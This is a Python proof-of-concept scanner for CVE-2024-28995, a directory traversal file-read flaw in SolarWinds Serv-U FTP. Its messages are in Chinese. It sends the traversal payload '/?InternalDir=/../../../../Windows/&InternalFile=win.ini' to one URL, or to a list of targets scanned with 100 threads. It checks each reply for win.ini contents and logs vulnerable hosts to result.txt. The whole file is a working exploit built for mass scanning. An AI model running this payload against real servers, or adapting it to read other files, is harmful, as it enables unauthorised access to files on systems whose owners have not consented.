import argparse, sys, requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()



def banner():
    test = ("""                                                   
    ______________________________________________ ___  /
    ___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
    __  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
    _  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
    /_/                                                  
                                        author:personal
                                        time:2024.9.11
                                        version:1.0.0
    """)
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description='SolarWinds Serv-U FTP 目录遍历文件读取漏洞（CVE-2024-28995）')
    parser.add_argument('-u', '--url', dest='url', type=str, help='intput link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")

def poc(target):
    payload_url = '/?InternalDir=/../../../../Windows/&InternalFile=win.ini'
    url = target + payload_url
    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        res = requests.get(url, headers=header, verify=False, timeout=5)

        if res.status_code == 200 and 'support' in res.text and '[fonts]' in res.text:
            print(f"[+]该url{target}存在目录遍历文件读取漏洞")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-]该url{target}不存在目录遍历文件读取漏洞")
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()